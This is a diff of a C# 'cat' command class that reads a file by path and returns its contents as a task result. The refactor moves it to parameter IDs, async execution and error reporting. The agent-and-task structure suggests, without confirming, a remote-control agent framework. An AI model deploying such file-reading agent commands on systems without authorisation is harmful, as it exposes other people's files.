@@ -1,41 +1,36 @@
 ﻿using Agent.Models;
+using Shared;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Agent.Commands
 {
     public class CatCommand : AgentCommand
     {
-        public override string Name => "cat";
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.Cat;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            string path;
-            if (task.SplittedArgs.Length != 1)
+            if (!task.HasParameter(ParameterId.Path))
             {
-                context.Result.Result = $"Usage : {this.Name} file_to_display";
+                context.Error($"Path is mandatory!");
                 return;
             }
 
-            path = task.SplittedArgs[0];
-          
-            if(!File.Exists(path))
-            {
-                context.Result.Result = $"Failed to delete {path}";
-                return;
-            }
+            string path = task.GetParameter<string>(ParameterId.Path);
 
             if (!File.Exists(path))
             {
-                context.Result.Result = $"{path} not found";
+                context.Error($"{path} not found");
                 return;
             }
 
             string text = System.IO.File.ReadAllText(path);
-            context.Result.Result = text;
+            context.AppendResult(text);
         }
 
 
